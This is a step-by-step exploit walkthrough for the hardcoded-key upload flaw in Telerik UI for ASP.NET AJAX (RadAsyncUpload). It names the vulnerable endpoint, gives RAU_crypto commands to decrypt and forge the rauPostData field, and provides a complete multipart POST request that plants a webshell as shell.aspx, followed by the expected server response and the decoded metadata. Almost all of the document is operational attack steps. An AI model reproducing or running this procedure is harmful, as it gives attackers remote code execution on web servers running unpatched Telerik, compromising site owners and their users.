# Webshell exploit - Telerik UI for ASP.NET AJAX

The Telerik library has an hardcoded key, then it is possible to decode the "rauPostData" and to modify it in order to upload a webshell.

First you have to identify the vulnerable link: https://URL/Telerik.Web.UI.WebResource.axd?type=rau

Then you have to use the following python script available on github in order to decrypt/encrypt the "rauPostData" field:  https://github.com/bao7uo/RAU_crypto:

```
python3 RAU_crypto.py -D "ATTu5i4R+ViNFYO6kst0jC11wM/1iqH+W/isjhaDjNuCI7eJ/BY5d1E9eqZK27CJCMuon9u8/hgRIM/cTlgLlv4qOYjPBjs81Y3dAZAdtIr3TXiCmZi9M09a1BYMxjvGKfVky3b7PoOppeWS/3rgldxu1TGN4BfIe3ZPc2c3sB35eKSQ0h48TaSQv2K/BE4Jh23M1Ac3/ERQgqlx+BhCkdKH6MnBdL5avdiJIYeRgqLjIfzPqHi6jL6PWyXWr/su+RYAwlu...qQFE7IKGs="
```

Une fois décodé, on obtient le résultat suivant :

```
JSON: {"TargetFolder":"jgas0mTw==","TempTargetFolder":"YIGV6iU3FJMHN7xqIJFEon6eU=","MaxFileSize":31457280,"TimeToLive":{"Hours":4,"Minutes":0,"Seconds":0,"Milliseconds":0,"Ticks":144000000000,"Days":0,"TotalDays":0.16666666666666666,"TotalHours":4,"TotalMilliseconds":14400000,"TotalMinutes":240,"TotalSeconds":14400},"UseApplicationPoolImpersonation":false,"AllowedFileExtensions":[".pdf",".txt",".rtf",".doc",".docx",".docm",".dot",".dotx",".dotm",".csv",".xls",".xlsx",".xlsm",".xlt",".xltx",".xltm",".xlsb",".xlam",".ppt",".pptx",".pptm",".pps",".ppsx",".ppsm",".potx",".potm",".ppam",".sldx",".sldm",".msg",".png",".gif",".jpg",".jp2",".tiff",".bmp",".zip",".xml"]}
```

The two important elements to retrieve are:

 - TempTargetFolder = **D:\WWW\APP\App_Data\RadUploadTemp** 
 - Version =  **2014.3.1024.40**

Once these elements retrieve, it is possible to prepare the new POST request with the Webshell:

```
python3 RAU_crypto2.py -p "D:\WWW\APP" "2014.3.1024.40" shell.aspx
```

(Shell.aspx is the path where you store the webshell on your local machine)

Then you just have to send the upload form with:

-  the modified "rauPostData";
- the "UploadID" wich will be the name of your webshell to upload


```
POST /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1
Host: URL
...
Connection: close

-----------------------------9756552771978474811260608736
Content-Disposition: form-data; name="rauPostData"

ATTu5i4R+ViNFY...FE7IKGs=

-----------------------------9756552771978474811260608736
Content-Disposition: form-data; name="file"; filename="blob"
Content-Type: application/octet-stream

<!-- INSERT HERE WEBSHELL -->

-----------------------------9756552771978474811260608736
Content-Disposition: form-data; name="fileName"

aze.jpg
-----------------------------9756552771978474811260608736
Content-Disposition: form-data; name="contentType"

image/jpeg
-----------------------------9756552771978474811260608736
Content-Disposition: form-data; name="lastModifiedDate"

2017-12-12T20:26:12.000Z
-----------------------------9756552771978474811260608736
Content-Disposition: form-data; name="metadata"

{"TotalChunks":1,"ChunkIndex":0,"TotalFileSize":27775,"UploadID":"shell.aspx","IsSingleChunkUpload":false}
-----------------------------9756552771978474811260608736--
```

You should have a similar response:

```
HTTP/1.1 200 OK
Content-Length: 619

{"fileInfo":{"FileName":"aze.jpg","ContentType":"image/jpeg","ContentLength":1657,"DateJson":"2017-12-12T20:26:12.000Z","Index":0}, "metaData":"CS8S/Z0J/b2982DRxDin0BBslA7fI0cWMuWlPu4W3FnNOs7VxBpjTqF/KbG9UGJsxKh5U7y7dwOs9mh76GOdBONL03/qL+TB4qbl6aSL5Gb/NdrY/hxEfmzfS+ZfJyYp7oTkhxWPzL+wf+uIPRQkufxCOGaPx3/KmDen+xMjfMqiprf4he4lAyq7g+sCm+mj6B24nCQAAiCegue/21Mrjd0o34x20/lFf82UcLCLpGASd9fAmfSloWakoJIMFj48Mf0Iov3JOw03Zfu2FMSlmEnkhZtflIIJxdFvw6fRcYkl+ZGRGnEAtljzxrlhqyPigEwEjOSSLnJCyFAWJzab5eeeu/VuFGGdMXB6cBbLleT0UVgUtl0BD6hn48RhHAIkkF1SyIu6ht96OyAu4n9oaGRhmojjyMQ4Lw+HE3TVF516Y028+xqZM3UdErg7JL9GoTtU4rjMzQFpEMTM7XBOZw==" }
```

By decoding the "metaData" field:

```
{"TempFileName":"shell.aspx","AsyncUploadTypeName":"Telerik.Web.UI.UploadedFileInfo, Telerik.Web.UI, Version=2014.3.1024.40, Culture=neutral, PublicKeyToken=121fa..ba3d4"}
```

## Links:
https://www.the-s-unit.nl/node/78

http://www.acenyethehackerguy.com/2017/11/the-issue-asyncuploadhandler-in.html

https://github.com/straightblast/UnRadAsyncUpload/wiki

https://github.com/bao7uo/RAU_crypto
